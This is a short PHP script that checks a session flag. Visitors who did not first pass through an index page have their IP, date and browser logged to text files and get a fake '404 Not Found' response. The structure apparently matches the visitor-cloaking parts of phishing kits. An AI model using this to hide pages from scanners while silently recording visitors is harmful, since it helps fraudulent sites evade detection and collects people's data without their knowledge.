<?php
function log_visitors_denied2($error, $directory){
    if($_SESSION['page_a_visited'] !== true){
        $v_ip = $_SERVER['REMOTE_ADDR'];
        $v_date = date("l d F H:i:s");
        $v_agent = $_SERVER['HTTP_USER_AGENT'];

        $fp = fopen($directory."/logs/denied_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent - REASON: $error\r\n");
        fclose($fp);
        //IPS Collection
        $v_ip = $_SERVER['REMOTE_ADDR'];
        $v_date = date("l d F H:i:s");
        $v_agent = $_SERVER['HTTP_USER_AGENT'];

        $fp = fopen($directory."/logs/ips.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);
    }
}

if(!isset($_SESSION['page_a_visited'])){
	log_visitors_denied2('Index_Page_Not_Visited', $directory);
    header("HTTP/1.0 404 Not Found");
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>